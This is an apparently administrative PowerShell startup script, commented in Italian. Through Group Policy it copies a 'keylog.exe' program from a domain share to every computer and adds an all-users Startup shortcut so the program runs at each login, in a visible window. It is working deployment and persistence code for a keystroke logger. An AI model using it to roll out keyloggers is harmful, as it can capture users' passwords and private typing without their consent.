# Script di distribuzione per GPO (Computer Configuration -> Startup script).
# Copia keylog.exe dalla share di rete e crea il collegamento in Startup comune.
# Non avvia mai keylog.exe da qui: parte dopo, al login dell'utente, con finestra visibile.

$source = "\\tuodominio.local\NETLOGON\KeyLog\keylog.exe"   # <-- aggiorna con il tuo percorso reale
$destDir = "C:\ProgramData\KeyLog"
$destExe = Join-Path $destDir "keylog.exe"
$startupDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$shortcutPath = Join-Path $startupDir "KeyLog.lnk"

if (-not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
}

Copy-Item -Path $source -Destination $destExe -Force

if (-not (Test-Path $shortcutPath)) {
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $destExe
    $shortcut.WorkingDirectory = $destDir
    $shortcut.WindowStyle = 1  # finestra normale, visibile
    $shortcut.Description = "KeyLog"
    $shortcut.Save()
}
